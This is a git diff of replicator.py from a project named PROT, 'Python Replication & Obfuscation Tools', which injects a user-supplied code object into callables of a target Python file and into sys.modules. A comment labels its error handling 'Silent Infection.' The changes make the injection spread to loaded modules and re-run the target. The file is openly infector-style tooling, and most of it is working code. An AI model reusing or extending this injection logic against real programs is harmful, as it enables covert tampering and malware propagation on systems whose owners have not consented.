@@ -1,22 +1,22 @@
 """
 PROT - Python Replication & Obfuscation Tools
-Python 3.10
+Python 3.9.13
 file replicator.py: code replication logics.
 https://github.com/Romansko/PROT/blob/main/prot/replicator.py
 """
 import inspect
 import sys
-
 import utils
-from sys import argv, exit, modules
+from sys import argv, exit
 from os import path
+from io import StringIO
 
 
 class Replicator:
     """ Replication logics """
 
     DEF_RECURSE = 4  # 5 is too much...
-    FILTER = ['replicator', 'utils']
+    FILTER = ['replicator', 'utils', 'prot']
 
     def __init__(self, recurseLevel=DEF_RECURSE):
         self.ico = None  # injected code
@@ -59,12 +59,12 @@ class Replicator:
         except:
             pass  # Silent Infection.
 
-    def replicate(self, injectedCodeOrFile, namespace):
+    def replicate(self, injectedCodeFilepath, namespace):
         """ Replicate targetCode with injectedCode. """
-        if not namespace or not injectedCodeOrFile:
+        if not namespace or not injectedCodeFilepath:
             print("[!] Invalid arguments.")
             return False
-        co = utils.extractCodeObject(injectedCodeOrFile)
+        co = utils.extractCodeObject(injectedCodeFilepath)
         if not co:
             return False
         self.ico = co
@@ -80,44 +80,44 @@ class FileReplicator(Replicator):
     def __init__(self, recurseLevel=Replicator.DEF_RECURSE):
         super().__init__(recurseLevel)
 
-    def replicate(self, injectedCodeOrFile, filepath):
+    def replicate(self, injectedCodeFilepath, filepath):
         """
         Load a target file, replicate user's code within callable object.
         """
-        if not filepath or not injectedCodeOrFile:
+        if not filepath or not injectedCodeFilepath:
             print("[!] Invalid arguments.")
             return False
-        co = utils.extractCodeObject(filepath)
-        if not co:
+        pfh = utils.PythonFileHandler()
+        if not pfh.open(filepath):
+            return None
+        code = pfh.read()
+        pfh.close()
+        if not code:
             return False
-        namespace = utils.execute(co)
+        namespace = utils.execute(code)
         if not namespace:
             return False
-        return super().replicate(injectedCodeOrFile, namespace)
+        _ = super().replicate(injectedCodeFilepath, namespace)
+        _ = super().replicate(injectedCodeFilepath, sys.modules)
+        _ = utils.execute(code)
+        return True
 
 
-def replicate(injectedCodeOrFile, targetFile=None):
+def replicate(injectedCodeFilepath, targetFile=None):
     if targetFile:
         replicator = FileReplicator()
         arg2 = targetFile
     else:
         replicator = Replicator()
         arg2 = sys.modules
-    return replicator.replicate(injectedCodeOrFile, arg2)
-
-
-def test():
-    print("[*] Testing Replicator...")
+    if not replicator.replicate(injectedCodeFilepath, arg2):
+        print("[!] Replication failed!")
 
 
 if __name__ == '__main__':
-    ret = True
     if not argv or len(argv) < 2:
-        exit(f"[!] Usage: python {path.basename(__file__)} <target_file.py> (<injected_code.py> | \"Injected Code\")")
+        exit(f"[!] Usage: python {path.basename(__file__)} <injected_code.py> <target_file.py>")
     elif len(argv) == 2:
-        ret = replicate(argv[1])
+        replicate(argv[1])
     else:
-        ret = replicate(argv[1], argv[2])
-    if not ret:
-        print("[!] Replication failed!")
-    test()
+        replicate(argv[1], argv[2])
